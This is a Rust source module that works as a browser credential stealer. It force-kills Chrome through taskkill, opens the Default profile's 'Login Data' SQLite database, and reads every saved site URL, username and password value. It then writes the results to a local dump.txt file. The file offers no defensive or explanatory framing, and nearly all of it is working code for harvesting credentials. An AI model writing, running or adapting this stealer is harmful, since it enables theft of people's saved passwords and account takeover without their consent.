use std::path::Path;
use std::process::Command;
use app_dirs::{get_app_dir, AppDataType, AppInfo};
use rusqlite::{Connection, NO_PARAMS, Error};
use crate::models::ChromeAccount;
use std::fs::File;
use std::io::Write;

const STMT: &'static str = "SELECT action_url, username_value, password_value FROM logins";

pub fn close_chrome() {
    Command::new("taskkill")
        .args(&["/F", "/IM", "chrome.exe"])
        .output()
        .unwrap();
}

fn find_chrome_path() -> Box<Path> {
    let app_info = AppInfo { name: "Chrome", author: "Google" };
    let path_buf =
        get_app_dir(AppDataType::UserCache, &app_info, "User Data/Default/Login Data");

    match path_buf {
        Ok(pf) => pf.into_boxed_path(),
        Err(_) => panic!("No chrome found!")
    }
}

fn query_accounts() -> Result<Vec<ChromeAccount>, Error> {
    let db_url = find_chrome_path();
    let conn_res = Connection::open(db_url);

    let conn = match conn_res {
        Ok(conn) => conn,
        Err(_) => panic!("Login Data not found!")
    };
    let mut stmt = conn.prepare(STMT)?;

    let chrome_acc_iter = stmt
        .query_map(NO_PARAMS, |row|
            Ok(ChromeAccount::new(row.get(0)?,
                                  row.get(1)?,
                                  row.get(2)?)
            )).unwrap();

    let mut chrome_accounts: Vec<ChromeAccount> = vec![];

    for chrome_acc in chrome_acc_iter {
        chrome_accounts.push(chrome_acc.unwrap());
    }

    return Ok(chrome_accounts);
}

pub fn dump_to_file() {
    let dump_res = query_accounts();
    let mut accounts = match dump_res {
        Ok(chrome_acc) => chrome_acc,
        Err(_) => panic!("Query failed")
    };

    let mut finalize_str = String::new();

    for acc in &mut accounts {
        finalize_str.push_str(format!("{}\r\n", acc.humanize()).as_str());
    }

    let mut file = File::create("./dump.txt").expect("Unable to create file");
    let res = file.write_all(finalize_str.as_bytes());
    match res {
        Ok(_) => println!("Dumped"),
        Err(_) => panic!("Dump failed!")
    };
}